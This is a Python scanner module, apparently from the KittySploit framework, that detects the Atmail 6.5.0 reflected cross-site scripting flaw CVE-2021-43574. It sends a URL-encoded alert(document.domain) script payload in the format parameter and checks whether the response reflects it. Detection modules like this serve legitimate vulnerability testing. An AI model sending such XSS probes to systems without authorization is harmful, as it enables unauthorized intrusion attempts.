#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""Atmail 6."""

from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'Atmail 6.5.0 - Cross-Site Scripting Detection',
        'description': 'Atmail 6.5.0 contains a cross-site scripting vulnerability in WebAdmin Control Pane via the format parameter to the default URI, which allows remote attackers to inject arbitrary web script or HTML via the “format” parameter.',
        'author': ['KittySploit Team'],
        'severity': 'medium',
        'tags': ['web', 'scanner', 'cve', 'cve2021', 'atmail', 'xss', 'vuln'],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 3,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.3,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0,
                'min_params': 0,
                'tech_hints_any': [],
                'tech_hints_all': [],
                'specializations_any': [],
                'risk_signals_any': [],
                'auth_session': False,
                'capabilities_any': [],
                'capabilities_all': [],
                'confidence_min': {},
                'confidence_min_any': {},
                'endpoint_pattern_any': [],
                'param_any': [],
                'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [
                    {
                        'capability': 'admin_surface',
                        'from_detail': '',
                    },
                ],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': ['auxiliary/scanner/http/login_page_detector'],
            },
        },
        'references': [
            'https://medium.com/@bhattronit96/cve-2021-43574-696041dcab9e',
            'https://help.atmail.com/hc/en-us/sections/115003283988',
            'https://nvd.nist.gov/vuln/detail/CVE-2021-43574',
            'https://medium.com/%40bhattronit96/cve-2021-43574-696041dcab9e',
            'https://github.com/ARPSyndicate/cvemon',
        ],
        'cve': 'CVE-2021-43574',
    }

    def run(self):
        for path in ('/?format=%22%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E', '/atmail/?format=%22%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E', '/atmail/webmail/?format=%22%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E'):
            r = self.http_request(method="GET", path=path, allow_redirects=False)
            if not r or r.status_code not in (500, 403):
                continue
            body = r.text or ""
            headers = "\n".join(f"{k}: {v}" for k, v in r.headers.items())
            body_any = ('<script>alert(document.domain)</script>" does not exist',)
            header_any = ('text/html',)
            if (any(m in body for m in body_any)) and (any(m in headers for m in header_any)):
                self.set_info(
                    severity='medium',
                    reason="Atmail 6.5.0 - Cross-Site Scripting detected",
                    path=path,
                )
                return True
        return False

